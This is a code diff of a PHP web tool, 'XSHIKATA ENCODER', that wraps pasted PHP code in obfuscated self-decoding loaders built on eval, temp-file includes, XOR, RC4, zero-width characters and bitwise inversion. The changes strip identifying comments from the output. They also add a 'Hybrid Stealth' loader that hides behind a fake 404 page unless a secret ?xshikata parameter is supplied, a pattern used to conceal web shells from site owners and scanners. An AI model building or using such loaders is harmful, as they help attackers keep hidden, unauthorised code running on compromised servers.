@@ -1,8 +1,10 @@
 <?php
 /*
-    XSHIKATA ENCODER V6 (INSANE EDITION)
-    UI: Cyberpunk V1 (Preserved)
-    New Methods: All Previous + Bitwise Inversion (Method 13 - Final Boss)
+    XSHIKATA ENCODER V8 (FINAL CLEAN)
+    UI: Cyberpunk V1 (Responsive)
+    Changes: 
+    - No Comments in Output (1-14)
+    - Method 14 Fixed Lock: ?xshikata
 */
 
 $result = "";
@@ -33,7 +35,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             $payload = implode('.', $encoded_array);
             $decoder = 'function xshikata($d){$k="xshikata";$p=explode(".",$d);$o="";$l=strlen($k);$i=0;foreach($p as $v){if($v==""||!is_numeric($v))continue;$o.=chr(($v/3)-ord($k[$i%$l]));$i++;}eval($o);}';
-            $result = '<?php' . "\n" . '/* Encoded: Math Shift */' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
+            // Clean output without comments
+            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
         }
 
         // ======================================================
@@ -43,7 +46,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $compressed = gzdeflate($clean_code, 9);
             $payload = base64_encode($compressed);
             $decoder = 'function xshikata($z){$b=base64_decode($z);$c=gzinflate($b);if($c)eval($c);}';
-            $result = '<?php' . "\n" . '/* Encoded: Quantum Gzip */' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
+            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
         }
 
         // ======================================================
@@ -57,7 +60,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             $payload = base64_encode($xor_res);
             $decoder = 'function xshikata($x){$k="' . $key . '";$d=base64_decode($x);$o="";for($i=0;$i<strlen($d);$i++){$o.=$d[$i]^$k[$i%8];}eval($o);}';
-            $result = '<?php' . "\n" . '/* Encoded: Binary XOR */' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
+            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
         }
 
         // ======================================================
@@ -80,7 +83,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             $payload = base64_encode($res);
             $decoder = 'function xshikata($d,$k){$s=range(0,255);$j=0;for($i=0;$i<256;$i++){$j=($j+$s[$i]+ord($k[$i%strlen($k)]))%256;$t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t;}$i=0;$j=0;$r="";$d=base64_decode($d);for($y=0;$y<strlen($d);$y++){$i=($i+1)%256;$j=($j+$s[$i])%256;$t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t;$r.=$d[$y]^chr($s[($s[$i]+$s[$j])%256]);}eval($r);}';
-            $result = '<?php' . "\n" . '/* Encoded: RC4 Ghost */' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\', \'' . $key . '\');' . "\n" . '?>';
+            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\', \'' . $key . '\');' . "\n" . '?>';
         }
 
         // ======================================================
@@ -93,7 +96,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             $payload = str_replace(['0', '1'], ["\xE2\x80\x8B", "\xE2\x80\x8C"], $bin);
             $decoder = 'function xshikata($s){$b=str_replace(["\xE2\x80\x8B","\xE2\x80\x8C"],["0","1"],$s);$o="";for($i=0;$i<strlen($b);$i+=8){$o.=chr(bindec(substr($b,$i,8)));}eval($o);}';
-            $result = '<?php' . "\n" . '/* Encoded: Invisible Ink (Select Empty Space Below to See) */' . "\n" . $decoder . "\n" . 'xshikata("' . $payload . '");' . "\n" . '?>';
+            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata("' . $payload . '");' . "\n" . '?>';
         }
 
         // ======================================================
@@ -104,7 +107,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $map = ['0'=>'🌑','1'=>'🌒','2'=>'🌓','3'=>'🌔','4'=>'🌕','5'=>'🌖','6'=>'🌗','7'=>'🌘','8'=>'🌙','9'=>'🌚','a'=>'🌛','b'=>'🌜','c'=>'🌝','d'=>'🌞','e'=>'⭐','f'=>'🌟'];
             $payload = strtr($hex, $map);
             $decoder = 'function xshikata($e){$m=["🌑"=>"0","🌒"=>"1","🌓"=>"2","🌔"=>"3","🌕"=>"4","🌖"=>"5","🌗"=>"6","🌘"=>"7","🌙"=>"8","🌚"=>"9","🌛"=>"a","🌜"=>"b","🌝"=>"c","🌞"=>"d","⭐"=>"e","🌟"=>"f"];$h=strtr($e,$m);eval(pack("H*",$h));}';
-            $result = '<?php' . "\n" . '/* Encoded: Emoji Crypt */' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
+            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
         }
 
         // ======================================================
@@ -129,7 +132,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $start_id = $ids[0];
             $switch_block = implode("\n", $cases);
             $decoder = "\$s=$start_id; \$o=\"\"; while(true) { switch(\$s) { $switch_block } }";
-            $result = "<?php\n/* Encoded: Switch-Case Machine (Native Hex) */\n$decoder\n?>";
+            $result = "<?php\n$decoder\n?>";
         }
 
         // ======================================================
@@ -155,7 +158,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $header = "$var_name=''; goto $start_label;";
             $body = implode("\n", $blocks);
             $footer = "$end_label: eval($var_name);";
-            $result = "<?php\n/* Encoded: Goto Stealth (With Eval) */\nerror_reporting(0);\n$header\n$body\n$footer\n?>";
+            $result = "<?php\nerror_reporting(0);\n$header\n$body\n$footer\n?>";
         }
 
         // ======================================================
@@ -182,7 +185,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $header = "$var_name=''; goto $start_label;";
             $body = implode("\n", $blocks);
             $footer = "$end_label: \$t=tempnam(sys_get_temp_dir(),'x'); file_put_contents(\$t,$var_name); include(\$t); unlink(\$t);";
-            $result = "<?php\n/* Encoded: Goto Stealth (No Eval) */\nerror_reporting(0);\n$header\n$body\n$footer\n?>";
+            $result = "<?php\nerror_reporting(0);\n$header\n$body\n$footer\n?>";
         }
 
         // ======================================================
@@ -224,7 +227,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $hex_payload = bin2hex($payload_ready);
             $class_code = "class $var_name { private $$prop_name = '$hex_payload'; public function __destruct() { \$c = hex2bin(\$this->$prop_name); \$t = tempnam(sys_get_temp_dir(), 'pk'); if(file_put_contents(\$t, \$c)) { include(\$t); unlink(\$t); } } } new $var_name();";
             $class_code = trim(preg_replace('/\s+/', ' ', $class_code));
-            $result = "<?php\n/* Encoded: OOP Destructor (Ghost Class) */\n$class_code\n?>";
+            $result = "<?php\n$class_code\n?>";
         }
 
         // ======================================================
@@ -240,39 +243,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $hex_fpc = bin2hex('file_put_contents');
             $hex_unl = bin2hex('unlink');
             $final_logic = "$v_payload=hex2bin('$hex_payload');$v_func_write=hex2bin('$hex_fpc');$v_func_unlk=hex2bin('$hex_unl');$v_path=tempnam(sys_get_temp_dir(),'gc');$v_func_write($v_path,$v_payload);include($v_path);$v_func_unlk($v_path);";
-            $result = "<?php\n/* Encoded: Dynamic Function Mapping (Ghost Call) */\n$final_logic\n?>";
+            $result = "<?php\n$final_logic\n?>";
         }
 
         // ======================================================
-        // METHOD 13: BITWISE INVERSION (NO-FUNC DECODE) - FINAL BOSS
+        // METHOD 13: BITWISE INVERSION (NO-FUNC DECODE)
         // ======================================================
         elseif ($method == 'bitwise') {
-            // Konsep: Menggunakan operator NOT (~) pada string.
-            // Tidak ada fungsi hex2bin atau base64_decode. Murni manipulasi bit native.
-            
-            // 1. Siapkan data fungsi dan payload
             $funcs = ['file_put_contents', 'unlink', 'tempnam', 'sys_get_temp_dir'];
             $vars = [];
-            
-            // Generate nama variabel acak
-            foreach($funcs as $f) {
-                $vars[$f] = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
-            }
+            foreach($funcs as $f) { $vars[$f] = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5); }
             $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
             $v_payload = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
-            
-            // 2. Encode Payload (dibungkus tag PHP)
             $payload_ready = "<?php " . $clean_code . " ?>";
-            $encoded_payload = ~$payload_ready; // Bitwise NOT
+            $encoded_payload = ~$payload_ready;
             
-            // 3. Encode Nama Fungsi
-            // Kita escape karakter binary agar aman di dalam string PHP ("\xFF...")
-            function safe_escape($str) {
-                $out = '';
-                for ($i = 0; $i < strlen($str); $i++) {
-                    $out .= '\x' . bin2hex($str[$i]);
+            if (!function_exists('safe_escape')) {
+                function safe_escape($str) {
+                    $out = ''; for ($i = 0; $i < strlen($str); $i++) { $out .= '\x' . bin2hex($str[$i]); } return $out;
                 }
-                return $out;
             }
             
             $str_fpc = safe_escape(~$funcs[0]);
@@ -281,8 +270,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $str_sys = safe_escape(~$funcs[3]);
             $str_pay = safe_escape($encoded_payload);
             
-            // 4. Susun Logic
-            // Dekode terjadi otomatis saat operator ~ dipanggil pada string binary
             $logic = "
 $vars[file_put_contents] = ~\"$str_fpc\";
 $vars[unlink] = ~\"$str_unl\";
@@ -295,11 +282,67 @@ $v_path = {$vars['tempnam']}({$vars['sys_get_temp_dir']}(), 'bw');
 include($v_path);
 {$vars['unlink']}($v_path);
 ";
-            // Minify
             $logic = trim(preg_replace('/\s+/', '', $logic));
-            $logic = str_replace(';', '; ', $logic); // Beri spasi sedikit
+            $logic = str_replace(';', '; ', $logic);
+            $result = "<?php\n$logic\n?>";
+        }
+
+        // ======================================================
+        // METHOD 14: HYBRID STEALTH (BITWISE + XOR + LOCK: xshikata)
+        // ======================================================
+        elseif ($method == 'hybrid') {
+            // 1. Setup Keys
+            $lock_param = 'xshikata'; // FIXED KEY
+            $xor_key = substr(md5(time()), 0, 8);
             
-            $result = "<?php\n/* Encoded: Bitwise Inversion (No-Func Decode) */\n$logic\n?>";
+            // 2. Prepare Payload (XOR -> Bitwise NOT)
+            $raw_payload = "<?php " . $clean_code . " ?>";
+            $xored = '';
+            for($i=0; $i<strlen($raw_payload); $i++) {
+                $xored .= $raw_payload[$i] ^ $xor_key[$i % 8];
+            }
+            $encoded_payload = ~$xored;
+
+            // 3. Prepare Dynamic Vars
+            $funcs = ['file_put_contents', 'unlink', 'tempnam', 'sys_get_temp_dir'];
+            $vars = [];
+            foreach($funcs as $f) { $vars[$f] = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5); }
+            $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
+            $v_pay  = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
+            $v_lock_name = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
+            
+            if (!function_exists('safe_escape')) {
+                function safe_escape($str) {
+                    $out = ''; for ($i = 0; $i < strlen($str); $i++) { $out .= '\x' . bin2hex($str[$i]); } return $out;
+                }
+            }
+
+            $str_fpc = safe_escape(~$funcs[0]);
+            $str_unl = safe_escape(~$funcs[1]);
+            $str_tmp = safe_escape(~$funcs[2]);
+            $str_sys = safe_escape(~$funcs[3]);
+            $str_lck = safe_escape(~$lock_param); // Encoded lock param name (xshikata)
+            $str_pay = safe_escape($encoded_payload);
+
+            // 4. Construct Decoder (FIXED SYNTAX)
+            $logic = "
+{$vars['file_put_contents']} = ~\"$str_fpc\";
+{$vars['unlink']} = ~\"$str_unl\";
+{$vars['tempnam']} = ~\"$str_tmp\";
+{$vars['sys_get_temp_dir']} = ~\"$str_sys\";
+$v_lock_name = ~\"$str_lck\";
+if(!isset(\$_GET[$v_lock_name])){header('HTTP/1.0 404 Not Found');die();}
+$v_pay = ~\"$str_pay\";
+for(\$i=0;\$i<strlen($v_pay);\$i++){\$j=\$i%8;{$v_pay}[\$i]={$v_pay}[\$i]^\"$xor_key\"[\$j];}
+$v_path = {$vars['tempnam']}({$vars['sys_get_temp_dir']}(),'hb');
+{$vars['file_put_contents']}($v_path, $v_pay);
+include($v_path);
+{$vars['unlink']}($v_path);
+";
+            $logic = trim(preg_replace('/\s+/', ' ', $logic)); 
+            
+            // Khusus method 14, ada tampilan pesan usage
+            $result = "<?php\n/* Usage: ?xshikata */\n$logic\n?>";
         }
     }
 }
@@ -310,7 +353,7 @@ include($v_path);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSHIKATA V6 INSANE</title>
+    <title>XSHIKATA V8 FINAL</title>
     <style>
         :root {
             --bg: #0d1117;
@@ -407,14 +450,23 @@ include($v_path);
         
         @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
         .error { color: #ff5555; margin-bottom: 10px; }
+
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            .header h1 { font-size: 1.5rem; }
+            .controls { flex-direction: column; align-items: stretch; }
+            select, button.btn-main { width: 100%; margin-bottom: 5px; }
+            textarea { font-size: 12px; padding: 10px; }
+            .box { padding: 15px; }
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <h1>[ XSHIKATA ENCODER V6 ]</h1>
-        <p style="color:#8b949e; font-size:12px; margin-top:5px;">INSANE POLYMORPHIC OBFUSCATOR</p>
+        <h1>[ XSHIKATA ENCODER V8 ]</h1>
+        <p style="color:#8b949e; font-size:12px; margin-top:5px;">CLEAN & RESPONSIVE</p>
     </div>
 
     <div class="box">
@@ -441,6 +493,7 @@ include($v_path);
                     <option value="oop">METHOD 11: OOP Destructor (Ghost Class)</option>
                     <option value="dynamic_call">METHOD 12: Dynamic Function Mapping (Ghost Call)</option>
                     <option value="bitwise">METHOD 13: Bitwise Inversion (No-Func Decode)</option>
+                    <option value="hybrid" style="color:red; font-weight:bold;">METHOD 14: Hybrid Stealth (Lock: ?xshikata)</option>
                 </select>
                 <button type="submit" class="btn-main">ENCODE PAYLOAD</button>
             </div>
@@ -464,7 +517,7 @@ include($v_path);
     <?php endif; ?>
     
     <div style="text-align:center; margin-top:30px; color:#30363d; font-size:11px;">
-        XSHIKATA V6 | INSANE EDITION
+        XSHIKATA V8 | CLEAN EDITION
     </div>
 </div>
 
